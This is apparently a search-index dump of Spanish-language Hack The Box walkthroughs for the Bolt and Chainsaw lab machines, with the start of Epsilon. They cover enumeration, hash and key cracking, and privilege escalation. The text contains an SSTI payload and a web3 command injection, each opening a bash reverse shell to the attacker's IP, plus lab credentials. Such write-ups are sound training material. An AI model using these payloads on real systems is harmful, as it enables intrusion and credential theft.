GnuPG Secret Key [ 32 /64 ]) Cost 1 ( s2k-count ) is 16777216 for all loaded hashes Cost 2 ( hash algorithm [ 1 :MD5 2 :SHA1 3 :RIPEMD160 8 :SHA256 9 :SHA384 10 :SHA512 11 :SHA224 ]) is 8 for all loaded hashes Cost 3 ( cipher algorithm [ 1 :IDEA 2 :3DES 3 :CAST5 4 :Blowfish 7 :AES128 8 :AES192 9 :AES256 10 :Twofish 11 :Camellia128 12 :Camellia192 13 :Camellia256 ]) is 9 for all loaded hashes Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status merrychristmas ( Eddie Johnson ) 1g 0 :00:16:45 DONE ( 2022 -09-24 21 :12 ) 0 .000994g/s 42 .62p/s 42 .62c/s 42 .62C/s merrychristmas..menudo Use the \"--show\" option to display all of the cracked passwords reliably Session completed # Una vez obtenida la password se procede a importar (merrychristmas): gpg --import gpg_key_eddie gpg: clave 1C2741A3DC3B4ABD: \"Eddie Johnson <eddie@bolt.htb>\" sin cambios gpg: clave 1C2741A3DC3B4ABD: clave secreta importada gpg: Cantidad total procesada: 1 gpg: sin cambios: 1 gpg: claves secretas le\u00eddas: 1 gpg: claves secretas importadas: 1 e # Y ya podemos descifrar el mensaje: gpg --decrypt pgp_message gpg: cifrado con clave de 2048 bits RSA, ID F65CA879A3D77FE4, creada el 2021 -02-25 \"Eddie Johnson <eddie@bolt.htb>\" { \"password\" : \"Z(2rmxsNW(Z?3=p/9s\" , \"description\" : \"\" } gpg: Firmado el s\u00e1b 06 mar 2021 16 :33:54 CET gpg: usando RSA clave 1C2741A3DC3B4ABD gpg: Firma correcta de \"Eddie Johnson <eddie@bolt.htb>\" [ desconocido ] gpg: ATENCI\u00d3N: \u00a1Esta clave no est\u00e1 certificada por una firma de confianza! gpg: No hay indicios de que la firma pertenezca al propietario. Huellas dactilares de la clave primaria: DF42 6BC7 A4A8 AF58 E50E DA0E 1C27 41A3 DC3B 4ABD # Se accede como root: su Password: Z ( 2rmxsNW ( Z?3 = p/9s root@bolt:/home/eddie/.gnupg# cat /root/root.txt c20c2e9900b8982e637d3ca71f7ddfa0","title":"Bolt"},{"location":"maquinas/linux/bolt/#bolt-htb","text":"","title":"Bolt HTB"},{"location":"maquinas/linux/bolt/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.114","title":"Recon"},{"location":"maquinas/linux/bolt/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.114 Se realiza un scan de los puertos abiertos: nmap -sVC -p22,80,443 10.10.11.114 -oN openPorts PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Starter Website - About |_http-server-header: nginx/1.18.0 (Ubuntu) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) | http-title: Passbolt | Open source password manager for teams |_Requested resource was /auth/login?redirect=%2F | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 |_ssl-date: TLS randomness does not represent time |_http-server-header: nginx/1.18.0 (Ubuntu) Subdomain fuzzing: # Se encuentran y a\u00f1aden dos nuevos subdominios demo y mail > gobuster vhost -u http://bolt.htb -w /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt -t 100 =============================================================== Gobuster v3.1.0 by OJ Reeves ( @TheColonial ) & Christian Mehlmauer ( @firefart ) =============================================================== [ + ] Url: http://bolt.htb [ + ] Method: GET [ + ] Threads: 100 [ + ] Wordlist: /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt [ + ] User Agent: gobuster/3.1.0 [ + ] Timeout: 10s =============================================================== 2022 /09/24 14 :41:17 Starting gobuster in VHOST enumeration mode =============================================================== Found: demo.bolt.htb ( Status: 302 ) [ Size: 219 ] Found: mail.bolt.htb ( Status: 200 ) [ Size: 4943 ] Admin password # Descargamos la imagen y se encuentra un hash de admin que se puede crackear: > wget http://bolt.htb/download/image.tar > strings image.tar | grep bolt.htb {} @bolt.htb support@bolt.htbz#Please confirm your profile changes DEFAULT_MAIL_SENDER = 'support@bolt.htb' support@bolt.htb ) adminadmin@bolt.htb $1$sm1RceCh$rSd3PygnS /6jlFDfF2J5q. ) admin@bolt.htbroot/ > john --wordlist = /usr/share/wordlists/rockyou.txt hash_des_unix Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash ( md5crypt, crypt ( 3 ) $1 $ ( and variants ) [ MD5 256 /256 AVX2 8x3 ]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status deadbolt ( ? ) 1g 0 :00:00:01 DONE ( 2022 -09-24 00 :43 ) 0 .8620g/s 148965p/s 148965c/s 148965C/s debie..curtis13 Use the \"--show\" option to display all of the cracked passwords reliably Session completed # Acceso al panel http://bolt.htb/admin/home admin:deadbolt","title":"Enum"},{"location":"maquinas/linux/bolt/#ssti-gaining-access-www-data","text":"En la p\u00e1gina demo.bolt.htb hay un apartado de registro pero con invitaci\u00f3n, revisando el c\u00f3digo se puede ver dicha key: grep -ri \"invite_code\" base/forms.py: invite_code = TextField ( 'Invite Code' , id = 'invite_code' , validators =[ DataRequired ()]) base/routes.py: code = request.form [ 'invite_code' ] base/templates/accounts/register.html: {{ form.invite_code ( placeholder = \"Invite Code\" , class = \"form-control\" ) }} cat routes.py | grep code stored_password = stored_password.decode ( 'utf-8' ) code = request.form [ 'invite_code' ] if code ! = 'XNSS-HSJW-3NGU-8XTJ' : return render_template ( 'code-500.html' ) if data is None and code == 'XNSS-HSJW-3NGU-8XTJ' : Tras crear un usuario, autom\u00e1ticamente te genera un correo con la misma password al cual se puede acceder por la url http://mail.bolt.htb. En la web demo.bolt.htb hay un SSTI en settings y te manda la confirmaci\u00f3n para aceptar los cambios y el output por correo: echo 'bash -c \"bash -i >& /dev/tcp/10.10.14.11/4443 0>&1\"' | base64 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS80NDQzIDA+JjEiCg == # Payload probado en diferentes campos: { \"siteurl\" : \"{{config.__class__.__init__.__globals__['os'].popen('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS80NDQzIDA+JjEiCg==| base64 -d | bash').read()}}\" } www-data@bolt:~/demo$ whoami www-data www-data@bolt:~/demo$ cat config.py \"\"\"Flask Configuration\"\"\" #SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db' SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail' SQLALCHEMY_TRACK_MODIFICATIONS = True SECRET_KEY = 'kreepandcybergeek' MAIL_SERVER = 'localhost' MAIL_PORT = 25 MAIL_USE_TLS = False MAIL_USE_SSL = False #MAIL_DEBUG = app.debug MAIL_USERNAME = None MAIL_PASSWORD = None DEFAULT_MAIL_SENDER = 'support@bolt.htb' www-data@bolt:/opt/google/chrome$ mysql -h localhost -u bolt_dba -p -D boltmail Enter password: dXUUHSW9vBpH5qRB","title":"SSTI - Gaining Access (www-data)"},{"location":"maquinas/linux/bolt/#movimiento-lateral-user-eddie","text":"Con linpeas se encuentran leaks de passwords: # linpeas resultados: 'host' = > 'localhost' , 'port' = > '3306' , 'username' = > 'passbolt' , 'password' = > 'rT2;jW7<eY8!dX8}pQ8%' , 'database' = > 'passboltdb' , # Acceso a la base de datos, se obtiene un correo cifrado con gpg: www-data@bolt:/dev/shm$ mysql -h localhost -u passbolt -p Enter password: rT2 ; jW7<eY8!dX8 } pQ8% | 643a8b12-c42c-4507-8646-2f8712af88f8 | 4e184ee6-e436-47fb-91c9-dccb57f250bc | cd0270db-c83f-4f44-b7ac-76609b397746 | -----BEGIN PGP MESSAGE----- Version: OpenPGP.js v4.10.9 Comment: https://openpgpjs.org wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7 FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov 8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey 5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6 TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984 = P38i -----END PGP MESSAGE----- # Reutilizaci\u00f3n de contrase\u00f1a de eddie (rT2;jW7<eY8!dX8}pQ8%) eddie@bolt:~$ cat user.txt 10fb73a66c95c4e66a6fbdea39a570b2","title":"Movimiento lateral =&gt; user eddie"},{"location":"maquinas/linux/bolt/#gpg-abuse-escalate-priv-to-root","text":"Se encuentra un mensajito de clark donde se habla de la importancia de una clave privada: eddie@bolt:~/.pki$ cat /var/mail/eddie From clark@bolt.htb Thu Feb 25 14 :20:19 2021 Return-Path: <clark@bolt.htb> X-Original-To: eddie@bolt.htb Delivered-To: eddie@bolt.htb Received: by bolt.htb ( Postfix, from userid 1001 ) id DFF264CD ; Thu, 25 Feb 2021 14 :20:19 -0700 ( MST ) Subject: Important! To: <eddie@bolt.htb> X-Mailer: mail ( GNU Mailutils 3 .7 ) Message-Id: < 20210225212019 .DFF264CD@bolt.htb> Date: Thu, 25 Feb 2021 14 :20:19 -0700 ( MST ) From: Clark Griswold <clark@bolt.htb> Hey Eddie, The password management server is up and running. Go ahead and download the extension to your browser and get logged in . Be sure to back up your private key because I CANNOT recover it. Your private key is the only way to recover your account. Once you 're set up you can start importing your passwords. Please be sure to keep good security in mind - there' s a few things I read about in a security whitepaper that are a little concerning... -Clark Se encuentra la clave privada en un archivo de logs de los directorios del home del usuario: # Se hashea para crackear: > gpg2john gpg_key_eddie File gpg_key_eddie Eddie Johnson: $gpg$* 1 *668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson <eddie@bolt.htb>::gpg_key_eddie # Se crackea el hash de la clave privada, tarda bastante: john --wordlist = /usr/share/wordlists/rockyou.txt hash_eddie --format = gpg Using default input encoding: UTF-8 Loaded 1 password hash ( gpg, OpenPGP / GnuPG Secret Key [ 32 /64 ]) Cost 1 ( s2k-count ) is 16777216 for all loaded hashes Cost 2 ( hash algorithm [ 1 :MD5 2 :SHA1 3 :RIPEMD160 8 :SHA256 9 :SHA384 10 :SHA512 11 :SHA224 ]) is 8 for all loaded hashes Cost 3 ( cipher algorithm [ 1 :IDEA 2 :3DES 3 :CAST5 4 :Blowfish 7 :AES128 8 :AES192 9 :AES256 10 :Twofish 11 :Camellia128 12 :Camellia192 13 :Camellia256 ]) is 9 for all loaded hashes Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status merrychristmas ( Eddie Johnson ) 1g 0 :00:16:45 DONE ( 2022 -09-24 21 :12 ) 0 .000994g/s 42 .62p/s 42 .62c/s 42 .62C/s merrychristmas..menudo Use the \"--show\" option to display all of the cracked passwords reliably Session completed # Una vez obtenida la password se procede a importar (merrychristmas): gpg --import gpg_key_eddie gpg: clave 1C2741A3DC3B4ABD: \"Eddie Johnson <eddie@bolt.htb>\" sin cambios gpg: clave 1C2741A3DC3B4ABD: clave secreta importada gpg: Cantidad total procesada: 1 gpg: sin cambios: 1 gpg: claves secretas le\u00eddas: 1 gpg: claves secretas importadas: 1 e # Y ya podemos descifrar el mensaje: gpg --decrypt pgp_message gpg: cifrado con clave de 2048 bits RSA, ID F65CA879A3D77FE4, creada el 2021 -02-25 \"Eddie Johnson <eddie@bolt.htb>\" { \"password\" : \"Z(2rmxsNW(Z?3=p/9s\" , \"description\" : \"\" } gpg: Firmado el s\u00e1b 06 mar 2021 16 :33:54 CET gpg: usando RSA clave 1C2741A3DC3B4ABD gpg: Firma correcta de \"Eddie Johnson <eddie@bolt.htb>\" [ desconocido ] gpg: ATENCI\u00d3N: \u00a1Esta clave no est\u00e1 certificada por una firma de confianza! gpg: No hay indicios de que la firma pertenezca al propietario. Huellas dactilares de la clave primaria: DF42 6BC7 A4A8 AF58 E50E DA0E 1C27 41A3 DC3B 4ABD # Se accede como root: su Password: Z ( 2rmxsNW ( Z?3 = p/9s root@bolt:/home/eddie/.gnupg# cat /root/root.txt c20c2e9900b8982e637d3ca71f7ddfa0","title":"GPG abuse - Escalate priv to root"},{"location":"maquinas/linux/chainsaw/","text":"Chainsaw HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.143 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.10.14 Se realiza un scan de los puertos abiertos: nmap -sVC -p21,22,9810 10.10.10.142 -oN openPorts Nmap 7.92 scan initiated Sun Jul 24 23:16:28 2022 as: nmap -sVC -p21,22,9810 -oN openPorts 10.10.10.142 Nmap scan report for 10.10.10.142 Host is up (0.042s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 1001 1001 23828 Dec 05 2018 WeaponizedPing.json | -rw-r--r-- 1 1001 1001 243 Dec 12 2018 WeaponizedPing.sol |_-rw-r--r-- 1 1001 1001 44 Jul 24 21:12 address.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.2 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA) | 256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA) |_ 256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519) 9810/tcp open unknown | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 400 Bad Request | Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent | Access-Control-Allow-Origin: * | Access-Control-Allow-Methods: * | Content-Type: text/plain | Date: Sun, 24 Jul 2022 21:16:40 GMT | Connection: close | Request | GetRequest: | HTTP/1.1 400 Bad Request | Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent | Access-Control-Allow-Origin: * | Access-Control-Allow-Methods: * | Content-Type: text/plain | Date: Sun, 24 Jul 2022 21:16:39 GMT | Connection: close | Request | HTTPOptions: | HTTP/1.1 200 OK | Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent | Access-Control-Allow-Origin: * | Access-Control-Allow-Methods: * | Content-Type: text/plain | Date: Sun, 24 Jul 2022 21:16:39 GMT |_ Connection: close Explotation - Intrusion Script de python para usar las funciones del Smartcontract: from web3 import Web3, eth import json address = '0xF37F7c7d307ba662dF2B2612dc3c6562793a6664' w3 = Web3(Web3.HTTPProvider('http://10.10.10.142:9810')) w3.eth.defaultAccount = w3.eth.accounts[0] json_file = json.loads(open(\"WeaponizedPing.json\", \"r\").read()) abi = json_file['abi'] contract = w3.eth.contract(address=address, abi=abi) contract.functions.getDomain().call() contract.functions.setDomain(\"10.10.14.11; bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'\").transact() Lateral Movement - administrator => bobby Iteramos sobre los objetos de IPFS y encontamos la id_rsa de bobby: administrator@chainsaw:/home/administrator/.ipfs/blocks/2H$ for i in $(ipfs refs local); do ipfs cat $i 2>/dev/null; read; done Cracking Passphrase SSHKEY Extraemos el hasd de la id_rsa y se procede a crackear: john -w=/usr/share/wordlists/rockyou.txt /home/x/Documentos/htb/chainsaw/id_rsa_hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes Cost 2 (iteration count) is 2 for all loaded hashes Will run 2 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status jackychain (id_rsa_bobby) 1g 0:00:00:15 DONE (2022-07-28 19:39) 0.06309g/s 904838p/s 904838c/s 904838C/sa6_123..*7\u00a1Vamos! Session completed Escalate Privileges - bobby => root (shell) Script python3 para usar las funciones del smartcontract con suid ubicado en /home/bobby/projects/ChainsawClub: Se crea una password en MD5: bobby@chainsaw:~/projects/ChainsawClub$ echo -n pollero | md5sum from web3 import Web3, eth import json address = '0xa19939019126d08c9eAbd1810839715Be6DEf7F5' w3 = Web3(Web3.HTTPProvider('http://127.0.0.1:63991')) w3.eth.defaultAccount = w3.eth.accounts[0] json_file = json.loads(open(\"ChainsawClub.json\", \"r\").read()) abi = json_file['abi'] contract = w3.eth.contract(address=address, abi=abi) contract.functions.setApprove(True).transact() contract.functions.setUsername(\"root\").transact() contract.functions.setPassword('9966500c077a4772e34b36768155057c').transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.getBalance().call() Steganography - BMAP https://www.computersecuritystudent.com/FORENSICS/HIDING/lesson1/index.html : Ejemplo de ocultar data en fichero: cat /root/secreto.txt | bmap --mode putslack fichero_sorpresa.txt >> Descubrir data oculta: root@chainsaw:~/.ssh# bmap --mode slack /root/root.txt getting from block 2655304 file size was: 52 slack size: 4044 block size: 4096 68c874b7deca1b9dd386cd4c395b06e3","title":"Chainsaw"},{"location":"maquinas/linux/chainsaw/#chainsaw-htb","text":"","title":"Chainsaw HTB"},{"location":"maquinas/linux/chainsaw/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.143","title":"Recon"},{"location":"maquinas/linux/chainsaw/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.10.14 Se realiza un scan de los puertos abiertos: nmap -sVC -p21,22,9810 10.10.10.142 -oN openPorts Nmap 7.92 scan initiated Sun Jul 24 23:16:28 2022 as: nmap -sVC -p21,22,9810 -oN openPorts 10.10.10.142 Nmap scan report for 10.10.10.142 Host is up (0.042s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 1001 1001 23828 Dec 05 2018 WeaponizedPing.json | -rw-r--r-- 1 1001 1001 243 Dec 12 2018 WeaponizedPing.sol |_-rw-r--r-- 1 1001 1001 44 Jul 24 21:12 address.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.2 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA) | 256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA) |_ 256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519) 9810/tcp open unknown | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 400 Bad Request | Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent | Access-Control-Allow-Origin: * | Access-Control-Allow-Methods: * | Content-Type: text/plain | Date: Sun, 24 Jul 2022 21:16:40 GMT | Connection: close | Request | GetRequest: | HTTP/1.1 400 Bad Request | Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent | Access-Control-Allow-Origin: * | Access-Control-Allow-Methods: * | Content-Type: text/plain | Date: Sun, 24 Jul 2022 21:16:39 GMT | Connection: close | Request | HTTPOptions: | HTTP/1.1 200 OK | Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent | Access-Control-Allow-Origin: * | Access-Control-Allow-Methods: * | Content-Type: text/plain | Date: Sun, 24 Jul 2022 21:16:39 GMT |_ Connection: close","title":"Enum"},{"location":"maquinas/linux/chainsaw/#explotation-intrusion","text":"Script de python para usar las funciones del Smartcontract: from web3 import Web3, eth import json address = '0xF37F7c7d307ba662dF2B2612dc3c6562793a6664' w3 = Web3(Web3.HTTPProvider('http://10.10.10.142:9810')) w3.eth.defaultAccount = w3.eth.accounts[0] json_file = json.loads(open(\"WeaponizedPing.json\", \"r\").read()) abi = json_file['abi'] contract = w3.eth.contract(address=address, abi=abi) contract.functions.getDomain().call() contract.functions.setDomain(\"10.10.14.11; bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'\").transact()","title":"Explotation - Intrusion"},{"location":"maquinas/linux/chainsaw/#lateral-movement-administrator-bobby","text":"Iteramos sobre los objetos de IPFS y encontamos la id_rsa de bobby: administrator@chainsaw:/home/administrator/.ipfs/blocks/2H$ for i in $(ipfs refs local); do ipfs cat $i 2>/dev/null; read; done","title":"Lateral Movement - administrator =&gt; bobby"},{"location":"maquinas/linux/chainsaw/#cracking-passphrase-sshkey","text":"Extraemos el hasd de la id_rsa y se procede a crackear: john -w=/usr/share/wordlists/rockyou.txt /home/x/Documentos/htb/chainsaw/id_rsa_hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes Cost 2 (iteration count) is 2 for all loaded hashes Will run 2 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status jackychain (id_rsa_bobby) 1g 0:00:00:15 DONE (2022-07-28 19:39) 0.06309g/s 904838p/s 904838c/s 904838C/sa6_123..*7\u00a1Vamos! Session completed","title":"Cracking Passphrase SSHKEY"},{"location":"maquinas/linux/chainsaw/#escalate-privileges-bobby-root-shell","text":"Script python3 para usar las funciones del smartcontract con suid ubicado en /home/bobby/projects/ChainsawClub: Se crea una password en MD5: bobby@chainsaw:~/projects/ChainsawClub$ echo -n pollero | md5sum from web3 import Web3, eth import json address = '0xa19939019126d08c9eAbd1810839715Be6DEf7F5' w3 = Web3(Web3.HTTPProvider('http://127.0.0.1:63991')) w3.eth.defaultAccount = w3.eth.accounts[0] json_file = json.loads(open(\"ChainsawClub.json\", \"r\").read()) abi = json_file['abi'] contract = w3.eth.contract(address=address, abi=abi) contract.functions.setApprove(True).transact() contract.functions.setUsername(\"root\").transact() contract.functions.setPassword('9966500c077a4772e34b36768155057c').transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.transfer(100).transact() contract.functions.getBalance().call()","title":"Escalate Privileges - bobby =&gt; root (shell)"},{"location":"maquinas/linux/chainsaw/#steganography-bmap","text":"https://www.computersecuritystudent.com/FORENSICS/HIDING/lesson1/index.html : Ejemplo de ocultar data en fichero: cat /root/secreto.txt | bmap --mode putslack fichero_sorpresa.txt >> Descubrir data oculta: root@chainsaw:~/.ssh# bmap --mode slack /root/root.txt getting from block 2655304 file size was: 52 slack size: 4044 block size: 4096 68c874b7deca1b9dd386cd4c395b06e3","title":"Steganography - BMAP"},{"location":"maquinas/linux/epsilon/","text":"Epsilon HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.134 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.134 Se realiza un scan de los puertos abiertos: nmap -sCV -p22,80 10.10.11.134 -oN openPorts PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 | http-git: | 10.10.11.134:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... |_ Last commit message: Updating Tracking API # Please enter the commit message for... |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: 403 Forbidden Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Fuzzing (se fuzzea el directorio .git que nos reporta nmap): ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.134/.git/FUZZ -e .php,.bak,.git -t 300 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.134/.git/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .php .bak .git :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 300 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ index [Status: 